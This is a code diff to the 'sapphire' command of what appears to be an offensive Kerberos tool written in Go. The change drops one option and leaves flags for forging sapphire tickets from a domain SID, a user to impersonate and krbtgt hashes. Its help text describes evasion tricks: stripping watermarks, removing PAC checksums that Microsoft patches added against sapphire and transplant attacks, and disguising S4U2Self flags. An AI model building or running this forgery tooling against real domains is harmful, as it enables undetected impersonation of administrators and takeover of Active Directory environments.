@@ -463,7 +463,7 @@ func cmdSapphire(args []string) error {
 	fs := flag.NewFlagSet("sapphire", flag.ExitOnError)
 	var domainSID, impersonate, krbtgtHash, krbtgtAES, outfile string
 	var userID uint
-	var stripWatermark, stripLogonFlags, stripPACAttributes, stripFullChecksum, stripTicketChecksum, normalizeBufferOrder, syncClientInfoTime bool
+	var stripWatermark, stripLogonFlags, stripPACAttributes, stripFullChecksum, stripTicketChecksum, syncClientInfoTime bool
 
 	fs.StringVar(&domainSID, "domain-sid", "", "Domain SID (S-1-5-21-...)")
 	fs.StringVar(&impersonate, "impersonate", "", "User to impersonate (e.g., Administrator)")
@@ -477,7 +477,6 @@ func cmdSapphire(args []string) error {
 	fs.BoolVar(&stripPACAttributes, "strip-pac-attributes", false, "Rewrite PAC_ATTRIBUTES_INFO flags 0x2 (PAC_WAS_GIVEN_IMPLICITLY, S4U2Self) → 0x1 (PAC_WAS_REQUESTED, AS-REQ)")
 	fs.BoolVar(&stripFullChecksum, "strip-full-checksum", false, "Remove PAC_FULL_CHECKSUM buffer (type 19, KB5020805 anti-sapphire measure)")
 	fs.BoolVar(&stripTicketChecksum, "strip-ticket-checksum", false, "Remove PAC_TICKET_CHECKSUM buffer (type 16, KB5008380 anti-transplant HMAC). WARNING: may fail on strict-enforcement DCs.")
-	fs.BoolVar(&normalizeBufferOrder, "normalize-buffer-order", false, "Reorder PAC buffers to canonical KDC-native layout (LOGON_INFO, CLIENT_INFO, UPN_DNS, checksums, ATTRIBUTES, REQUESTOR)")
 	fs.BoolVar(&syncClientInfoTime, "sync-client-info-time", false, "Rewrite CLIENT_INFO.ClientId FILETIME to match forged TGT AuthTime (matches legit TGT invariant)")
 	fs.Parse(args)
 
@@ -556,16 +555,15 @@ func cmdSapphire(args []string) error {
 		UserID:         uint32(userID),
 		KrbtgtNTHash:   krbtgtNTHash,
 		KrbtgtAES256:   krbtgtAES256,
-		KDC:                  flags.kdc,
-		TGT:                  tgt,
-		SessionKey:           sessionKey,
-		StripWatermark:       stripWatermark,
-		StripLogonFlags:      stripLogonFlags,
-		StripPACAttributes:   stripPACAttributes,
-		StripFullChecksum:    stripFullChecksum,
-		StripTicketChecksum:  stripTicketChecksum,
-		NormalizeBufferOrder: normalizeBufferOrder,
-		SyncClientInfoTime:   syncClientInfoTime,
+		KDC:                 flags.kdc,
+		TGT:                 tgt,
+		SessionKey:          sessionKey,
+		StripWatermark:      stripWatermark,
+		StripLogonFlags:     stripLogonFlags,
+		StripPACAttributes:  stripPACAttributes,
+		StripFullChecksum:   stripFullChecksum,
+		StripTicketChecksum: stripTicketChecksum,
+		SyncClientInfoTime:  syncClientInfoTime,
 	}
 
 	result, err := forge.ForgeSapphireTicket(context.Background(), req)
